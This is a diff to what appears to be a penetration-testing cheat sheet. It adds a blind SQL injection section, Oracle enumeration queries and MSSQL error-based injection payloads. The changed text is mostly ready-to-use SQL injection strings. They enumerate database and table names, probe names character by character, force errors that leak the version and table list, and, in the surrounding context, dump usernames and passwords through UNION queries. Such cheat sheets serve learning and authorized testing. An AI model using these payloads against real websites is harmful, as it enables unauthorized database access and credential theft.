@@ -18,6 +18,7 @@
   * [Hashcat](#hashcat)
 * [SQL Injection](#SQL-Injection)
   * [Examining the database](#examining-the-database)
+  * [Blind SQL Injection](#Blind-SQL-Injection)
   * [Error based SQL Injection](#error-based-sql-injection)
   * [Filter bypass](#filter-bypass)
 * [Dumb Shell to Fully Interactive Shell](#dumb-shell-to-fully-interactive-shell)
@@ -348,19 +349,31 @@ UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_
 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 0x7573657273# 0x7573657273 = 'users'
 UNION SELECT USER, PASSWORD FROM USERS#
 
--- blind sql injection
+--  Oracle
+SELECT USER FROM DUAL;
+SELECT table_name FROM user_tables;
+SELECT * FROM T_USER WHERE ROWNUM <= 5;
+~~~
+
+reference: [https://portswigger.net/web-security/sql-injection/examining-the-database](https://portswigger.net/web-security/sql-injection/examining-the-database)
+
+## Blind SQL Injection
+
+~~~
 if((select count(*) from information_schema.tables where table_schema='{DBNAME}') = 1, 1, 0) # check exist dbname
 LENGTH((select table_name from information_schema.tables where table_schema='{DBNAME}'))={i} # examining dbname length
 SUBSTRING((select table_name from information_schema.tables where table_schema='{DBNAME}'),{i},1)='{word}' # examining table name
 ~~~
 
-reference: [https://portswigger.net/web-security/sql-injection/examining-the-database](https://portswigger.net/web-security/sql-injection/examining-the-database)
 
 ## Error Based SQL Injection
 
 ~~~ sql
 -- MSSQL
 if (@@VERSION)=9 select 1 else select 2;
+' AND 1=CONVERT(int, (SELECT @@version)) -- -
+' AND 1=CONVERT(int, DB_NAME()) -- -
+' AND 1=CONVERT(int,(SELECT STRING_AGG(name, ',') FROM sysobjects WHERE xtype='U'))-- -
 ~~~
 
 ## Filter bypass
